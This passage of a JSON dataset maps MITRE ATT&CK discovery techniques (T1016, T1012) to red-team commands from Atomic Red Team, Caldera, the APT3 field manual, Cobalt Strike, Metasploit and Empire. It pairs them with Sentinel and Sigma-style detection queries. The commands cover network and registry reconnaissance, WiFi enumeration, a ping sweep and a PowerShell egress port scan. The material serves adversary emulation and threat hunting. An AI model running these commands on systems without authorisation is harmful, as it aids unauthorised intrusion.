".\\wifi.ps1 -Pref\n", "payload": "wifi.ps1"}}, "darwin": {"sh": {"command": "./wifi.sh pref\n", "payload": "wifi.sh"}}, "linux": {"sh": {"command": "./wifi.sh pref\n", "payload": "wifi.sh"}}}, "name": "See the most used WIFI networks of a machine"}, {"source": "data/abilities/discovery/ac9dce33-2acc-4b34-94ce-2596409ce8f0.yml", "command": {"darwin": {"sh": {"command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"}}}, "name": "Ping the network in order to build the ARP cache"}, {"source": "data/abilities/discovery/b6f545ef-f802-4537-b59d-2cb19831c8ed.yml", "command": {"darwin": {"sh": {"command": "ifconfig | grep broadcast"}}}, "name": "Capture the local network broadcast IP address"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/dnsserver", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/dnsserver", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_proxy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_proxy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/arpscan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/arpscan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_subnet", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_subnet", "name": "Empire Module Command"}], "command_list": ["ipconfig /all", "shell ipconfig", "ipconfig\npost/windows/gather/enum_domains", "arp -a\nroute print", "shell arp -a", "route", "nbtstat -a {IP | COMP_NAME }", "shell c:\\windows\\sysnative\\nbstat.exe -a {IP | COMP_NAME}", "ipconfig /all\nnetsh interface show\narp -a\nnbtstat -n\nnet config\n", "netsh advfirewall firewall show rule name=all\n", "arp -a\nnetstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c\nifconfig\n", "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n", "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "$ports = Get-content #{port_file}\n$file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "$ports = Get-content PathToAtomicsFolder\\T1016\\src\\top-128.txt\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.nbtstat": [{"source": "network.domain.name"}]}, "command": "nbtstat -n\n"}}}, {"windows": {"psh": {"command": ".\\wifi.ps1 -Scan\n", "payload": "wifi.ps1"}}, "darwin": {"sh": {"command": "./wifi.sh scan\n", "payload": "wifi.sh"}}, "linux": {"sh": {"command": "./wifi.sh scan\n", "payload": "wifi.sh"}}}, {"windows": {"psh": {"command": ".\\wifi.ps1 -Pref\n", "payload": "wifi.ps1"}}, "darwin": {"sh": {"command": "./wifi.sh pref\n", "payload": "wifi.sh"}}, "linux": {"sh": {"command": "./wifi.sh pref\n", "payload": "wifi.sh"}}}, {"darwin": {"sh": {"command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"}}}, {"darwin": {"sh": {"command": "ifconfig | grep broadcast"}}}, "powershell/situational_awareness/host/dnsserver", "powershell/situational_awareness/host/dnsserver", "powershell/situational_awareness/host/get_proxy", "powershell/situational_awareness/host/get_proxy", "powershell/situational_awareness/network/arpscan", "powershell/situational_awareness/network/arpscan", "powershell/situational_awareness/network/powerview/get_subnet", "powershell/situational_awareness/network/powerview/get_subnet"], "technique_id": "T1016", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1016", "Built-in Windows Command": "ipconfig /all", "Cobalt Strike": "shell ipconfig", "Description": "Get information about the domain, network adapters, DNS / WSUS servers", "Metasploit": "ipconfig\npost/windows/gather/enum_domains"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1016", "Built-in Windows Command": "arp -a\nroute print", "Cobalt Strike": "shell arp -a", "Description": "Display the ARP table", "Metasploit": "route"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1016", "Built-in Windows Command": "nbtstat -a {IP | COMP_NAME }", "Cobalt Strike": "shell c:\\windows\\sysnative\\nbstat.exe -a {IP | COMP_NAME}", "Description": "Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller)", "Metasploit": ""}}, {"Atomic Red Team Test - System Network Configuration Discovery": {"display_name": "System Network Configuration Discovery", "atomic_tests": [{"description": "Identify network configuration information\n", "supported_platforms": ["windows"], "name": "System Network Configuration Discovery", "executor": {"elevation_required": false, "command": "ipconfig /all\nnetsh interface show\narp -a\nnbtstat -n\nnet config\n", "name": "command_prompt"}}, {"description": "Enumerates Windows Firewall Rules using netsh.\n", "supported_platforms": ["windows"], "name": "List Windows Firewall Rules", "executor": {"elevation_required": false, "command": "netsh advfirewall firewall show rule name=all\n", "name": "command_prompt"}}, {"description": "Identify network configuration information\n", "supported_platforms": ["macos", "linux"], "name": "System Network Configuration Discovery", "executor": {"elevation_required": false, "command": "arp -a\nnetstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c\nifconfig\n", "name": "sh"}}, {"description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n", "supported_platforms": ["windows"], "name": "System Network Configuration Discovery (Trickbot Style)", "executor": {"elevation_required": false, "command": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n", "name": "command_prompt"}}, {"dependencies": [{"description": "Test requires #{port_file} to exist\n", "get_prereq_command": "New-Item -Type Directory (split-path #{port_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"#{portfile_url}\" -OutFile \"#{port_file}\"\n", "prereq_command": "if (Test-Path \"#{port_file}\") {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "List Open Egress Ports", "executor": {"elevation_required": false, "command": "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "name": "powershell", "cleanup_command": "Remove-Item -ErrorAction ignore \"#{output_file}\""}, "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n", "input_arguments": {"portfile_url": {"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt", "type": "Url", "description": "URL to top-128.txt"}, "output_file": {"default": "$env:USERPROFILE\\Desktop\\open-ports.txt", "type": "Path", "description": "Path of file to write port scan results"}, "port_file": {"default": "PathToAtomicsFolder\\T1016\\src\\top-128.txt", "type": "Path", "description": "The path to a text file containing ports to be scanned, one port per line. The default list uses the top 128 ports as defined by Nmap."}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1016"}}, {"Mitre Stockpile - Find Domain information": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.nbtstat": [{"source": "network.domain.name"}]}, "command": "nbtstat -n\n"}}}, "description": "Find Domain information", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "id": "14a21534-350f-4d83-9dd7-3c56b93a0c17", "name": "Find Domain"}}, {"Mitre Stockpile - View all potential WIFI networks on host": {"platforms": {"windows": {"psh": {"command": ".\\wifi.ps1 -Scan\n", "payload": "wifi.ps1"}}, "darwin": {"sh": {"command": "./wifi.sh scan\n", "payload": "wifi.sh"}}, "linux": {"sh": {"command": "./wifi.sh scan\n", "payload": "wifi.sh"}}}, "description": "View all potential WIFI networks on host", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9", "name": "Scan WIFI networks"}}, {"Mitre Stockpile - See the most used WIFI networks of a machine": {"platforms": {"windows": {"psh": {"command": ".\\wifi.ps1 -Pref\n", "payload": "wifi.ps1"}}, "darwin": {"sh": {"command": "./wifi.sh pref\n", "payload": "wifi.sh"}}, "linux": {"sh": {"command": "./wifi.sh pref\n", "payload": "wifi.sh"}}}, "description": "See the most used WIFI networks of a machine", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "id": "a0676fe1-cd52-482e-8dde-349b73f9aa69", "name": "Preferred WIFI"}}, {"Mitre Stockpile - Ping the network in order to build the ARP cache": {"platforms": {"darwin": {"sh": {"command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"}}}, "description": "Ping the network in order to build the ARP cache", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "id": "ac9dce33-2acc-4b34-94ce-2596409ce8f0", "name": "Ping network"}}, {"Mitre Stockpile - Capture the local network broadcast IP address": {"platforms": {"darwin": {"sh": {"command": "ifconfig | grep broadcast"}}}, "description": "Capture the local network broadcast IP address", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "id": "b6f545ef-f802-4537-b59d-2cb19831c8ed", "name": "Snag broadcast IP"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1016", "Empire Module": "powershell/situational_awareness/host/dnsserver", "Technique": "System Network Configuration Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/dnsserver\":  [\"T1016\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1016", "Empire Module": "powershell/situational_awareness/host/get_proxy", "Technique": "System Network Configuration Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/get_proxy\":  [\"T1016\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1016", "Empire Module": "powershell/situational_awareness/network/arpscan", "Technique": "System Network Configuration Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/arpscan\":  [\"T1016\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1016", "Empire Module": "powershell/situational_awareness/network/powerview/get_subnet", "Technique": "System Network Configuration Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_subnet\":  [\"T1016\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_command_line contains \"net.exe\"and file_directory contains \"config\")or (process_command_line contains \"ipconfig.exe\"or process_command_line contains \"netsh.exe\"or process_command_line contains \"arp.exe\"or process_command_line contains \"nbtstat.exe\")", "product": "Azure Sentinel", "name": "System Network Configuration Discovery"}, {"query": "Yml\ntitle: windows system network configuration discovery\ndescription: windows server 2016\nreferences:\ntags: T1016\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ ARP.EXE' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: arp * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ ipconfig.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: ipconfig * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ nbtstat.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: nbtstat * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ ROUTE.EXE' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: route * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection1 OR selection2 OR selection3 OR selection4\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections ", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "reg queryval -k \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" -v fDenyTSConnections\npost/windows/gather/enum_termserv", "name": "Metasploit"}, {"source": "atomics/T1012/T1012.yaml", "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n", "name": null}, {"source": "data/abilities/discovery/2488245e-bcbd-405d-920e-2de27db882b3.yml", "command": {"windows": {"psh": {"command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"}}}, "name": "Query Registry using PowerShell Get-ItemProperty"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "name": "registry_path"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator> reg query \"HKEY_CURRENT_USER \\ Software \\ Microsoft \\ Terminal Server Client \\ Default\" / ve\nError: The system can not find the specified registry key or value.", "name": "Dos"}], "command_list": ["reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections ", "shell reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections", "reg queryval -k \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" -v fDenyTSConnections\npost/windows/gather/enum_termserv", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n", {"windows": {"psh": {"command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"}}}, "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "cmd.exe reg (query|add)", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "cmd.exe reg (query|add)", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "powershell/situational_awareness/network/powerview/get_cached_rdpconnection", "Dos\nC: \\ Users \\ Administrator> reg query \"HKEY_CURRENT_USER \\ Software \\ Microsoft \\ Terminal Server Client \\ Default\" / ve\nError: The system can not find the specified registry key or value."], "technique_id": "T1012", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1012", "Built-in Windows Command": "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections ", "Cobalt Strike": "shell reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections", "Description": "Check for the current registry value for terminal services, 